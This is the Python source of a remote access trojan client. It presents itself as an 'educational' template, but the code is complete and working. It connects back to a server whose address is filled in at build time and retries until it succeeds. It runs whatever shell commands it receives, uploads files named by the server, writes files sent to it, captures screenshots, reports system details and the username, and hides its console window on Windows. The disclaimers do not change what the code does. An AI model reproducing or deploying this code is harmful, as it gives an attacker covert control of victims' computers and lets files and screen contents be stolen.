#!/usr/bin/env python3
# Educational RAT Client Template - For learning purposes only
# This program should only be used in controlled test environments

import socket
import subprocess
import os
import platform
import time
import sys
import base64
import ipaddress
from threading import Thread

# Global variables
SERVER_HOST = "127.0.0.1"  # Will be replaced during generation
SERVER_PORT = 4444         # Will be replaced during generation
BUFFER_SIZE = 4096
CONNECTION_RETRY = 10      # Seconds between connection attempts

# Try to import screenshot functionality, but continue if not available
try:
    import pyautogui
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

def test_connection(host, port):
    """Test connectivity to the server and provide diagnostic information"""
    print(f"\n[*] Testing connection to {host}:{port}...")
    
    # Check if we're trying to connect to localhost from possibly another machine
    is_local_ip = False
    try:
        ip_obj = ipaddress.ip_address(host)
        is_local_ip = ip_obj.is_loopback
    except:
        if host in ["localhost", "127.0.0.1"]:
            is_local_ip = True
    
    if is_local_ip:
        print("[!] Using localhost/127.0.0.1 - this only works if client and server are on the same machine")
        print("[!] For different machines, the server needs to use its LAN IP address")
    
    # Test TCP connection
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        s.close()
        print("[+] Connection successful! Server is reachable.")
        return True
    except ConnectionRefusedError:
        print("[!] Connection refused. The server is not running or is blocking connections.")
        print("[!] Troubleshooting steps:")
        print("    1. Make sure the server is running")
        print("    2. Check that the server IP and port are correct")
        print("    3. Check Windows Firewall settings and allow Python in the rules")
        print(f"    4. Verify the port {port} is not blocked")
        return False
    except socket.timeout:
        print("[!] Connection timed out. The server might be:")
        print("    1. Behind a firewall")
        print("    2. On a different network segment")
        print("    3. IP address might be incorrect")
        return False
    except socket.gaierror:
        print(f"[!] Address error. Unable to resolve hostname {host}")
        print("    Please use an IP address instead of a hostname")
        return False
    except Exception as e:
        print(f"[!] Connection error: {str(e)}")
        return False

def get_system_info():
    """Get system information for identification"""
    system = platform.system()
    info = {
        "System": system,
        "Node": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Username": os.getlogin() if hasattr(os, 'getlogin') else 'Unknown'
    }
    
    return " | ".join([f"{k}: {v}" for k, v in info.items()])

def execute_command(command):
    """Execute a shell command and return its output"""
    # Determine appropriate shell based on OS
    shell = True if platform.system() == "Windows" else False
    
    try:
        # Split command into parts for Linux/Mac
        cmd_parts = command.split() if not shell else command
        
        # Execute the command
        process = subprocess.Popen(
            cmd_parts, 
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        
        # Get command output
        stdout, stderr = process.communicate()
        
        if stderr:
            result = stderr.decode()
        else:
            result = stdout.decode()
            
        # Handle empty output
        if not result:
            result = "[+] Command executed successfully (no output)"
            
        return result
        
    except Exception as e:
        return f"[!] Error executing command: {str(e)}"

def upload_file(client_socket, file_path):
    """Upload a file to the server"""
    try:
        if not os.path.exists(file_path):
            client_socket.send("File not found".encode())
            return
        
        # Get file size and send it to server
        file_size = os.path.getsize(file_path)
        client_socket.send(str(file_size).zfill(10).encode())
        
        # Wait for server to be ready
        response = client_socket.recv(1024).decode()
        
        if response == "ready":
            # Send the file in chunks
            with open(file_path, "rb") as f:
                data = f.read(BUFFER_SIZE)
                while data:
                    client_socket.send(data)
                    data = f.read(BUFFER_SIZE)
            
            return True
        return False
        
    except Exception as e:
        print(f"Error uploading file: {e}")
        return False

def download_file(client_socket, file_path):
    """Download a file from the server"""
    try:
        # Get file size
        file_size_data = client_socket.recv(1024).decode()
        file_size = int(file_size_data)
        
        # Tell server we're ready to receive
        client_socket.send("ready".encode())
        
        # Receive file data
        received_data = b""
        remaining_bytes = file_size
        
        while remaining_bytes > 0:
            data = client_socket.recv(min(BUFFER_SIZE, remaining_bytes))
            if not data:
                break
                
            received_data += data
            remaining_bytes -= len(data)
        
        # Save the file
        with open(file_path, "wb") as f:
            f.write(received_data)
            
        client_socket.send("[+] File downloaded successfully".encode())
        return True
        
    except Exception as e:
        client_socket.send(f"[!] Error downloading file: {str(e)}".encode())
        return False

def take_screenshot(client_socket):
    """Capture screen and send to server"""
    if not SCREENSHOT_AVAILABLE:
        client_socket.send(b"FAIL")
        return
    
    try:
        # Take screenshot
        screenshot = pyautogui.screenshot()
        
        # Convert to bytes
        import io
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        screenshot_data = img_bytes.getvalue()
        
        # Send screenshot size to server
        size = len(screenshot_data)
        client_socket.send(b"PASS")
        client_socket.send(str(size).zfill(10).encode())
        
        # Wait for server ready signal
        client_socket.recv(1024)
        
        # Send screenshot data
        client_socket.sendall(screenshot_data)
        
    except Exception as e:
        client_socket.send(b"FAIL")
        print(f"Error taking screenshot: {e}")

def main():
    """Main function to run the client"""
    global SERVER_HOST
    global SERVER_PORT
    
    # Test connectivity first
    test_connection(SERVER_HOST, SERVER_PORT)
    
    # Periodically try to connect to the server
    while True:
        try:
            print(f"[*] Attempting to connect to {SERVER_HOST}:{SERVER_PORT}...")
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_HOST, SERVER_PORT))
            print(f"[+] Connected to {SERVER_HOST}:{SERVER_PORT}")
            
            while True:
                command = client.recv(BUFFER_SIZE).decode()
                
                if not command:
                    # Connection lost
                    print("[!] Connection lost. Attempting to reconnect...")
                    break
                    
                # Handle specific commands
                if command == "sysinfo":
                    # System information
                    response = get_system_info()
                    client.send(response.encode())
                    
                elif command.startswith("download"):
                    # Send file to server
                    _, file_path = command.split(" ", 1)
                    print(f"[*] Uploading {file_path} to server...")
                    upload_file(client, file_path)
                    
                elif command.startswith("upload"):
                    # Receive file from server
                    _, file_path = command.split(" ", 1)
                    print(f"[*] Downloading {file_path} from server...")
                    download_file(client, file_path)
                    
                elif command == "screenshot":
                    # Take screenshot and send to server
                    print("[*] Taking screenshot...")
                    take_screenshot(client)
                    
                elif command == "exit":
                    # Exit command from server
                    print("[!] Received exit command, shutting down...")
                    client.close()
                    sys.exit(0)
                    
                else:
                    # Execute shell command
                    print(f"[*] Executing: {command}")
                    response = execute_command(command)
                    client.send(response.encode())
                    
        except ConnectionRefusedError:
            print(f"[!] Connection refused. Server at {SERVER_HOST}:{SERVER_PORT} is not reachable.")
            print(f"[*] Retrying in {CONNECTION_RETRY} seconds...")
        except ConnectionResetError:
            print("[!] Connection reset by the server. Possibly shut down.")
            print(f"[*] Retrying in {CONNECTION_RETRY} seconds...")
        except socket.timeout:
            print("[!] Connection timed out.")
            print(f"[*] Retrying in {CONNECTION_RETRY} seconds...")
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            print(f"[*] Retrying in {CONNECTION_RETRY} seconds...")
            
        # If we get here, the loop has broken - wait and retry
        time.sleep(CONNECTION_RETRY)

if __name__ == "__main__":
    print("[*] Educational RAT Client - FOR EDUCATIONAL PURPOSES ONLY")
    print("[*] Using this software for unauthorized access is ILLEGAL")
    
    # Hide console window on Windows if possible
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    main() 